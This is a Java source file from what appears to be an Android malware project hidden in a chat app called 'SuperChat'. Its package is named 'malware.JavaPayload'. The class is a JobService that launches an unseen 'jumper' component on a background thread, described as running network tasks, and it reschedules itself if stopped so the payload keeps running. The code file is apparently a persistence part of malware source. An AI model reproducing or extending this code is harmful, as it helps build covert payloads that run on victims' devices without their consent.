package com.teamxdevelopers.SuperChat.malware.JavaPayload;


import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

/*

This class extends JobService and is used to perform background tasks using Android's JobScheduler API,
 which allows for efficient scheduling of tasks that need to run in the background, even when the app is not in the foreground.

 onStartJob: This method is called when the job starts, logging its initiation and calling doBackgroundWork to perform the actual background task.
onStopJob: Called if the job is stopped before completion, logging this event and marking the job as cancelled.
doBackgroundWork: Runs in a separate thread to perform the background task. Here, it initializes a jumper instance to perform some network-related tasks.
Job Rescheduling: By returning true in onStopJob, it indicates that the job should be rescheduled if it's stopped before completion.

 */
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class jobScheduler extends JobService {

    private static final String TAG ="jobSchedulerTest";
    private boolean jobCancelled = false;

    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        // Log start of job
        Log.d(TAG, "Job started");
        // Execute background work
        doBackgroundWork(jobParameters);
        // Return true to indicate that background work is still ongoing
        return true;
    }

    private void doBackgroundWork(final JobParameters params) {
        // Create a new thread for background work
        new Thread(new Runnable() {
            @Override
            public void run() {
                // Execute some task
                new jumper(getApplicationContext()).init();
                // Log completion of job
                Log.d(TAG, "Job finished");
                // Mark job as finished
                jobFinished(params, false);
            }
        }).start();
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        // Log job cancellation
        Log.d(TAG, "Job cancelled before completion");
        // Mark job as cancelled
        jobCancelled = true;
        // Return true to reschedule job
        return true;
    }


}
